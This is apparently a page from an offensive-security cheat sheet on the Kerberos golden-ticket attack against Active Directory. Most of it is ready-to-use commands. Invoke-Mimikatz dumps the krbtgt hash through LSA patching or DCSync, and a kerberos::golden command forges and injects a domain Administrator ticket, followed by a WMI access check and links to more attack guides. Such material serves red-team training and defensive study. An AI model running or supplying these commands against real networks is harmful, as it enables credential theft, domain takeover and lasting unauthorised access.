# 🔥 Golden tickets

### **ump hashes - Get the krbtgt hash**

```
Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
```

### **Make golden ticket**

Use /ticket instead of /ptt to save the ticket to file instead of loading in current powershell process To get the SID use `Get-DomainSID` from powerview

{% code overflow="wrap" %}
```
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:<domain> /sid:<domain sid> /krbtgt:<hash> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```
{% endcode %}

### **Use the DCSync feature for getting krbtgt hash. Execute with DA privileges**

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
```

### **Check WMI Permission**

```
Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
```

### Read All information about Golden Tickets - Theory and Practice

<table data-card-size="large" data-view="cards" data-full-width="true"><thead><tr><th></th><th></th><th></th><th data-hidden data-card-target data-type="content-ref"></th><th data-hidden data-card-cover data-type="files"></th></tr></thead><tbody><tr><td>Commands: <a href="https://gitbook.ad-attacks.com/domain-persistence/golden-ticket">https://gitbook.ad-attacks.com/domain-persistence/golden-ticket</a></td><td></td><td></td><td><a href="https://gitbook.ad-attacks.com/domain-persistence/golden-ticket">https://gitbook.ad-attacks.com/domain-persistence/golden-ticket</a></td><td><a href="../.gitbook/assets/Golden Tickets.png">Golden Tickets.png</a></td></tr><tr><td>All About Active Directory Hacking</td><td><a href="https://ad-attacks.com/golden-ticket-attack-explained/">Golden Tickets Theory</a></td><td></td><td><a href="https://ad-attacks.com/">https://ad-attacks.com/</a></td><td><a href="../.gitbook/assets/Homepage.png">Homepage.png</a></td></tr></tbody></table>

### Sources

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-golden-tickets" %}
